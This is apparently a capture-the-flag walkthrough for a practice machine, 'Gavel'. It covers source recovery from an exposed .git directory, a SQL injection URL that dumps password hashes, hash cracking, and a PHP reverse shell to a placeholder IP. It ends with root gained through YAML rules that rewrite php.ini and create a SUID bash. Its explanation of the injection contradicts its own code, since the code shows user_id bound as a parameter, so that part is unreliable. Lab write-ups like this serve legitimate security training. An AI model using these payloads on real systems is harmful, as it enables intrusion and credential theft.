## Overview

![Gavel](/images/writeups/gavel/logo.png)

| Field | Details |
|---|---|
| **Machine** | Gavel |
| **OS** | Linux |
| **Difficulty** | Medium |
| **Status** | Active |

## TL;DR

- ffuf finds `/.git/` exposed on the web server
- git-dumper reconstructs source → SQL injection in `inventory.php` via `user_id` parameter
- SQLi dumps `auctioneer` bcrypt hash → john cracks it → admin panel access
- PHP reverse shell injected into "edit rule" field → shell as `www-data` → su to `auctioneer`
- Root daemon reads YAML files and executes PHP `rule` field → overwrite `php.ini` to unlock `system()` → SUID bash → root

## Tools Used

- nmap, ffuf, git-dumper, burpsuite, john, netcat, gavel-util

## Setup / Notes

```bash
echo "<ip> gavel.htb" | sudo tee -a /etc/hosts
```

---

## Recon

```bash
nmap -p- -sC -sV gavel.htb
```

![nmap: ports 22 and 80 open](/images/writeups/gavel/nmap.png)

Two ports: 22 (SSH) and 80 (HTTP). All attack surface is on the web app.

## Enumeration

Visiting `http://gavel.htb` shows a functional auction platform:

![Gavel auction web app](/images/writeups/gavel/gavelwb1.png)

### Discovering Hidden Endpoints

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u http://gavel.htb/FUZZ -e .php
```

Key finds:
- `/admin.php`: admin dashboard (requires auth)
- `/inventory.php`: user inventory
- `/.git/`: exposed Git repository

### Dumping the Git Repository

```bash
git-dumper http://gavel.htb/.git/ ./gavel-source
```

![git-dumper extracting source](/images/writeups/gavel/git-dumper.png)

We now have the full PHP source. Never deploy `.git/` to production.

### Understanding the SQL Injection Through Source Code

Now, reading through the actual PHP files (especially `inventory.php`), the vulnerability becomes crystal clear:

```php
$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "`" . str_replace("`", "", $sortItem) . "`";
$itemMap = [];
$itemMeta = $pdo->prepare("SELECT name, description, image FROM items WHERE name = ?");
try {
    if ($sortItem === 'quantity') {
        $stmt = $pdo->prepare("SELECT item_name, item_image, item_description, quantity FROM inventory WHERE user_id = ? ORDER BY quantity DESC");
        $stmt->execute([$userId]);
    } else {
        $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
        $stmt->execute([$userId]);
    }
    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
} catch (Exception $e) {
    $results = [];
}
```

By studying the code directly, you understand:

- **Why `user_id` is vulnerable**: The variable is passed directly to `execute()` without being parameterized. Even though `$col` uses prepared statements, `$userId` is exposed to injection through the parameter binding.

- **The backtick handling**: The code tries to sanitize `$sortItem` by removing backticks (`str_replace("`", "", $sortItem)`), but this only protects the sort column, **not** the `user_id`.

- **The logic flow**: Depending on the `sort` parameter, different SQL queries fire, but both are vulnerable because `$userId` ultimately gets injected into the WHERE clause without proper escaping.

Now, let's hop on back to `gavel.htb` and make an account to play around with `/inventory.php`

## Exploit

![inventory.php](/images/writeups/gavel/inventory.png)

### Crafting the SQL Injection Payload

Now that you understand the vulnerability from reading the source code, it's time to exploit it. The goal is to dump the user credentials from the database, specifically targeting the `users` table where usernames and password hashes are stored.

The payload you'll craft looks like this:

```
http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+CONCAT(username,0x3a,password)+AS+`%27x`+from+users)y;--+-&sort=\?;--+-%00
```

Let's break down what's happening here, piece by piece:

**The Payload Anatomy:**

```
user_id=x`
```
We start by closing the expected identifier with a backtick. The `x`` is just a placeholder column name that we'll use later in our subquery.

```
+FROM+(SELECT+CONCAT(username,0x3a,password)+AS+%27x+from+users)y;
```
Here's where the magic happens. We inject a subquery that pulls `username` and `password` from the `users` table, concatenating them with a colon (`0x3a` is the hex code for `:`). The `%27` is a URL-encoded single quote (`'`), which helps the alias work correctly within the SQL syntax. We alias this result as `'x` so it matches our structure.

```
--+-
```
This is an SQL comment sequence. The `--` starts the comment, and `+-` acts as padding/spacing to ensure the comment properly terminates the rest of the original query.

```
&sort=\?;--+-%00
```
The sort parameter adds additional confusion to the parser. The backslash escapes the question mark, the `--+-` comments out anything trailing, and `%00` (null byte) can bypass certain parser quirks or WAF filters.

### Why This Works

The original query was supposed to be:

```sql
SELECT `item_name` FROM inventory WHERE user_id = ? ORDER BY item_name ASC
```

But with your injection, it transforms into:

```sql
SELECT x` FROM (SELECT CONCAT(username, 0x3a, password) AS 'x' FROM users) y; -- ORDER BY item_name ASC
```

The database executes your subquery, pulls credentials, and displays them in the results. The comments (`--`) safely discard the trailing `ORDER BY` clause.

### Executing the Attack

Go to your browser and put the URL with the SQLi in. The database executes the subquery and returns credentials in the page:

![SQLi successful: auctioneer hash dumped](/images/writeups/gavel/sqli-succ.png)

The hash is bcrypt (`$2y$` prefix).

### Crack the Hash

```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt auctioneer.hash
```

Password cracked. Log in at `http://gavel.htb/admin.php`.

### PHP RCE via Edit Rule

The admin panel has an "edit rule" field that's executed server-side as PHP:

![Admin panel](/images/writeups/gavel/webadmin.png)

![Edit rule field](/images/writeups/gavel/setting.png)

In the edit rule field, paste a reverse shell:

```php
system('bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'); return true;
```

The page refreshes every second. Paste quickly and click Edit. Set up your listener:

```bash
nc -lvnp 4444
```

Place a bid on the auction where you set the rule. The PHP executes when the bid is processed:

![shell as www-data](/images/writeups/gavel/www%20data.png)

Switch to `auctioneer`:

```bash
su auctioneer  # use the cracked password
```

## Privilege Escalation: YAML Rule Engine

In `/opt/gavel/` there's a `sample.yaml` showing how the auction daemon works:

![sample.yaml](/images/writeups/gavel/sample-yaml.png)

The daemon runs as root and evaluates the `rule` field as PHP. The config at `/opt/gavel/.config/php/php.ini` restricts `system()` via `disable_functions`, but we can overwrite it using the same rule engine.

### Step 1: Remove PHP Restrictions

Create a YAML that overwrites `php.ini`:

```bash
cat << 'EOF' > fix_ini.yaml
name: fixini
description: fix php ini
image: "x.png"
price: 1
rule_msg: "fixini"
rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisable_functions=\nopen_basedir=\n"); return false;
EOF

/usr/local/bin/gavel-util submit /home/auctioneer/fix_ini.yaml
```

Bid on the "fixini" auction in the web UI to trigger the rule. Verify:

```bash
cat /opt/gavel/.config/php/php.ini
# disable_functions= and open_basedir= should now be empty
```

### Step 2: Create SUID bash

```bash
cat << 'EOF' > rootshell.yaml
name: rootshell
description: make suid bash
image: "x.png"
price: 1
rule_msg: "rootshell"
rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;
EOF

/usr/local/bin/gavel-util submit /home/auctioneer/rootshell.yaml
```

Bid on the "rootshell" auction. The daemon (running as root) executes `system()` and creates a SUID bash:

```bash
ls -l /opt/gavel/rootbash
# -rwsr-xr-x 1 root root ...
```

```bash
/opt/gavel/rootbash -p
id
# uid=1001(auctioneer) gid=1001(auctioneer) euid=0(root)
```

## Lessons Learned

- Never expose `.git/` in production, the entire source history is recoverable with git-dumper
- Dynamic column injection bypasses PDO prepared statements, parameterization only protects values, not identifiers
- "Rule engines" that execute user-controlled strings are RCE primitives; treat them accordingly
- php.ini sandboxing is only effective if the config file itself is unwritable
- SUID copies of `/bin/bash` are a one-step persistent root escalation, audit for them regularly
